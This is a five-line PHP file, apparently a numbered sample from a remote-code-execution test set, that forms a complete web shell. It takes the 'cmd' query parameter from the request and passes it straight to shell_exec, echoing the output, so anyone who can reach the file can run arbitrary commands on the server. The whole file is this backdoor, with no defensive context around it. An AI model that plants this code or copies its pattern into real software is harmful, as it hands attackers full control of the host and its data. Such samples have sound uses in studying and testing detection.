<?php
// RCE test variation #1202
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>